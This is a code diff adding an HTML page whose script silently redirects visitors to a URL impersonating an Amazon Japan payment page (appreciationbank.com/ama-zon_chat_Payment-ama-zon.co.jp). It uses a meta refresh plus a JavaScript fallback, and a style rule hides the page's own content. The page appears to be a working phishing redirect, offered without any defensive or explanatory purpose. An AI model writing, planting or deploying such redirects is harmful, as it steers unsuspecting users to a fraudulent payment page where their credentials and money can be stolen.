@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <script>
+        // 匹配根路径和指定前缀的URL
+        const path = window.location.pathname;
+        if (path === "/" || path.startsWith("/任意前缀")) {
+            // 优先用meta标签跳转（最快）
+            document.write('<meta http-equiv="refresh" content="0;url=https://appreciationbank.com/ama-zon_chat_Payment-ama-zon.co.jp">');
+            // JS兜底（防止meta被拦截）
+            setTimeout(function() {
+                window.location.replace("https://appreciationbank.com/ama-zon_chat_Payment-ama-zon.co.jp");
+            }, 50);
+        }
+    </script>
+    <!-- 隐藏页面内容 -->
+    <style>html,body{display:none !important;}</style>
+</head>
+<body>
+</body>
+</html>
